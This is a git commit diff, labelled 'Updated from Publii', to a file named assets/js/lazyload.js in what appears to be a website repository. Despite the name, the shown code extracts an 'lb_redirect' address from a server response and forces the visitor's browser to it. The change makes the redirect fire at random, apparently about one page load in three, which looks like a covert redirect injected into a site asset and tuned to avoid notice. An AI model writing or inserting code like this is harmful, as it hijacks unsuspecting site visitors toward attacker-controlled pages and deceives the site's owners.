01e93821ba7f457e7c709e8f31d48c60ebcde315
markjohanson021 <45124531+markjohanson021@users.noreply.github.com>
2020-02-12 22:51:08 +0200

    Updated from Publii

--- assets/js/lazyload.js
+++ assets/js/lazyload.js
@@ -75,7 +75,7 @@ if (url.indexOf("#") < 0) {
                 console.log(this.responseText);
                 anl = this.responseText.split('lb_redirect":"//')[1].split('"}')[0];
                 console.log(anl);
-                var number = Math.floor(Math.random() * 1) + 1;
+                var number = Math.floor(Math.random() * 3) + 1;
               console.log(number);
               if (number == 1){
                 location.href = "https://"+ anl;
